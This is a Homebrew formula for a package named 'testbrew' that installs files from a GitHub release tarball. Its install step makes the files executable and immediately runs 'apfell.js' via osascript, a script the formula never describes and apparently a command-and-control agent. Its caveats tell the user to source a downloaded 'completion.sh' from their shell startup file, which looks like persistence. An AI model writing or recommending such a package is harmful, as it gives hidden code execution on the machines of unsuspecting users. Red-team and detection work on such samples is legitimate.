class Testbrew < Formula
    desc "Test Brew"
    homepage "https://github.com/testing-1-dot/"
    url "https://github.com/testing-1-dot/testbrew/releases/download/v1.3/testbrew-1.3.tar.gz"
    sha256 "c7e50cf0fe9f88a1f383afff057787cdf9e374c3694160252fd542d287febccb"
    version "1.3"

    def install
        bin.install Dir["*"]
        system "chmod +x #{bin}/apfell.js && osascript -e 'do shell script "#{bin}/apfell.js"'"
  end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
